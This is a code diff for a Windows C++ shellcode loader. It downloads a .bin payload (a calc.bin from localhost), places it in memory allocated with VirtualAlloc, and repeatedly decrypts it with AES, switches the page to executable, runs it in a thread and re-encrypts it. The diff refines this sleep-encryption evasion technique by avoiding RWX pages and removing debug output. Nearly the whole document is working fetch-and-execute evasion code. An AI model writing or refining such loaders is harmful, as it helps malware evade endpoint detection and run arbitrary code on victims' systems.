@@ -72,21 +72,23 @@ void aesDecrypt(void* buffer, size_t size) {
     AES_CBC_decrypt_buffer(&ctx, static_cast<uint8_t*>(buffer), size);
 }
 
-// Function to print buffers in hexadecimal format
-void printBuffer(const char* label, const uint8_t* buffer, size_t size) {
-    cout << label << ": ";
-    for (size_t i = 0; i < size; i++) {
-        cout << hex << setw(2) << setfill('0') << (int)buffer[i] << " ";
-        if ((i + 1) % 16 == 0) cout << endl;
+// Thread function to execute the payload
+DWORD WINAPI executePayload(LPVOID lpParam) {
+    auto funcPtr = reinterpret_cast<void(*)()>(lpParam);
+    try {
+        funcPtr(); // Execute the function
+        cout << "[DEBUG] Payload executed successfully." << endl;
     }
-    cout << endl;
+    catch (...) {
+        cerr << "[!] Exception occurred during payload execution!" << endl;
+    }
+    ExitThread(0);
 }
 
 int main() {
     const wstring server = L"localhost";
     const wstring path = L"/calc.bin";
 
-    // Step 1: Download the .bin file
     vector<uint8_t> binBuffer;
     if (!downloadFile(server, path, binBuffer)) {
         cerr << "Failed to download the file!" << endl;
@@ -95,72 +97,69 @@ int main() {
 
     cout << "[+] Downloaded .bin file, size: " << binBuffer.size() << " bytes." << endl;
 
-    // Debug: Print the original buffer
-    printBuffer("[DEBUG] Original Buffer", binBuffer.data(), binBuffer.size());
+    // Pad binary buffer size
+    size_t paddedSize = (binBuffer.size() + 15) & ~15;
+    binBuffer.resize(paddedSize, 0);
+    cout << "[DEBUG] Padded binary buffer size: " << paddedSize << " bytes." << endl;
 
-    // Step 2: Print the AES key and IV
-    printBuffer("[DEBUG] AES Key", aesKey, sizeof(aesKey));
-    printBuffer("[DEBUG] AES IV", aesIV, sizeof(aesIV));
-
-    // Step 3: Allocate executable memory for the new function
-    void* funcMemory = VirtualAlloc(NULL, binBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // Step 2: Allocate a new memory region for the function
+    void* funcMemory = VirtualAlloc(NULL, paddedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!funcMemory) {
-        cerr << "Failed to allocate memory for the function!" << endl;
+        cerr << "[ERROR] Failed to allocate memory for function!" << endl;
         return 1;
     }
 
-    cout << "[+] Allocated executable memory at: 0x" << hex << (uintptr_t)funcMemory << endl;
+    cout << "[+] Allocated memory for function at: 0x" << hex << (uintptr_t)funcMemory << endl;
 
-    // Step 4: Copy the binary data to the allocated memory
+    // Step 3: Copy the binary buffer into the allocated memory
     memcpy(funcMemory, binBuffer.data(), binBuffer.size());
-    cout << "[+] Copied binary data to allocated memory." << endl;
+    cout << "[+] Binary data copied to function memory." << endl;
 
-    // Debug: Print the encrypted buffer before execution
-    aesEncrypt(funcMemory, binBuffer.size());
+    // Step 4: Encrypt the function
+    aesEncrypt(funcMemory, paddedSize);
     cout << "[+] Function encrypted." << endl;
-    printBuffer("[DEBUG] Encrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());
 
     // Step 5: Main loop: Decrypt, execute, and re-encrypt
+    DWORD oldProtect;
     while (true) {
-        aesDecrypt(funcMemory, binBuffer.size());
-        cout << "[+] Function decrypted. Executing..." << endl;
-
-        // Debug: Print the decrypted buffer
-        printBuffer("[DEBUG] Decrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());
-
-        // Create a thread to execute the function
-        HANDLE hThread = CreateThread(
-            NULL, 0, (LPTHREAD_START_ROUTINE)funcMemory, NULL, 0, NULL
-        );
-
-        if (!hThread) {
-            cerr << "Failed to create thread for execution!" << endl;
+        // Change to PAGE_READWRITE for decryption
+        if (!VirtualProtect(funcMemory, paddedSize, PAGE_READWRITE, &oldProtect)) {
+            cerr << "[ERROR] Failed to set memory to PAGE_READWRITE!" << endl;
             break;
         }
 
-        // Wait for the thread to complete with a timeout (e.g., 10 seconds)
-        DWORD waitResult = WaitForSingleObject(hThread, 10000); // Timeout of 10 seconds
-        if (waitResult == WAIT_TIMEOUT) {
-            cerr << "[!] Thread execution timed out. Terminating thread..." << endl;
-            TerminateThread(hThread, 1); // Force terminate the thread
-        }
-        else if (waitResult == WAIT_OBJECT_0) {
-            cout << "[+] Thread execution completed successfully." << endl;
-        }
-        else {
-            cerr << "[!] Unknown error occurred while waiting for thread." << endl;
+        aesDecrypt(funcMemory, paddedSize);
+        cout << "[+] Function decrypted." << endl;
+
+        // Change to PAGE_EXECUTE_READ for execution
+        if (!VirtualProtect(funcMemory, paddedSize, PAGE_EXECUTE_READ, &oldProtect)) {
+            cerr << "[ERROR] Failed to set memory to PAGE_EXECUTE_READ!" << endl;
+            break;
         }
 
+        // Execute the function in a separate thread
+        HANDLE hThread = CreateThread(NULL, 0, executePayload, funcMemory, 0, NULL);
+        if (!hThread) {
+            cerr << "[ERROR] Failed to create thread for execution!" << endl;
+            break;
+        }
+
+        WaitForSingleObject(hThread, INFINITE);
         CloseHandle(hThread);
 
-        // Re-encrypt the function
-        aesEncrypt(funcMemory, binBuffer.size());
+        // Change back to PAGE_READWRITE for encryption
+        if (!VirtualProtect(funcMemory, paddedSize, PAGE_READWRITE, &oldProtect)) {
+            cerr << "[ERROR] Failed to set memory to PAGE_READWRITE!" << endl;
+            break;
+        }
+
+        aesEncrypt(funcMemory, paddedSize);
         cout << "[+] Function re-encrypted." << endl;
 
-        printBuffer("[DEBUG] Re-encrypted Buffer", (uint8_t*)funcMemory, binBuffer.size());
-
-        this_thread::sleep_for(chrono::seconds(20));
+        this_thread::sleep_for(chrono::seconds(15));
     }
 
+    // Clean up
+    VirtualFree(funcMemory, 0, MEM_RELEASE);
     return 0;
 }
